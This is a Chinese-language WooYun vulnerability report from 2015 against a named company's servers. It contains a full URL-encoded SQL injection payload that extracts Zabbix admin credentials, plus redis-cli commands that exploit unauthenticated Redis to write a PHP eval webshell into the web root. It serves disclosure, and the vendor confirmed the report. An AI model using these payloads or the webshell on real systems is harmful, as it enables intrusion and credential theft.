{"id": 30812, "wybug_id": "wooyun-2015-0115642", "wybug_title": "爱美主义某站SQL注入+redis未授权Getshell", "wybug_corp": "爱美主义", "wybug_author": "mango", "wybug_date": "2015-05-24 21:19", "wybug_open_date": "2015-07-09 09:44", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-05-24：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-05-25：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-06-04：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-06-14：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-06-24：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-07-09：\t细节向公众公开  简要描述： 求20rank 详细说明：  http://zb.aimeizhuyi.com:8888\nhttp://zb.aimeizhuyi.com:8888/httpmon.php?applications=2%20and%20%28select%201%20from%20%28select%20count%28*%29,concat%28%28select%28select%20concat%28cast%28concat%28alias,0x7e,passwd,0x7e%29%20as%20char%29,0x7e%29%29%20from%20zabbix.users%20LIMIT%200,1%29,floor%28rand%280%29*2%29%29x%20from%20information_schema.tables%20group%20by%20x%29a%29\n密码解不出来\n\n但是直接注入获取管理员的session值，直接登录\n\n试试命令执行\n\n按这样的话~~root一大把呀\n\n\n\n   漏洞证明：  121.40.88.95:6379未授权 但是找不到路径 发现这台服务器上运行这0A服务,通过扫OA的目录发现phpinfo一枚http://oa.aimeizhuyi.com/gc.php\n\n\nroot@kali:~/redis-2.8.19# src/redis-cli -h 121.40.88.95121.40.88.95:6379> config set dir /var/www/html/aimei_storage/oa/web/OK121.40.88.95:6379> config set dbfilename redis.phpOK121.40.88.95:6379> set webshell \"<?php @eval($_POST['pass']); ?>\"OK121.40.88.95:6379> saveOK121.40.88.95:6379>\n成功shell\n\n在shell上我发现被写入好多东西啊包括一些账号密码之类的~ 估计被redis写在里面的~\n\n   修复方案：     版权声明：转载请注明来源 mango@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2015-05-25 09:43 厂商回复： 感谢 mango 提醒我们系统存在的问题。我们马上修复。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}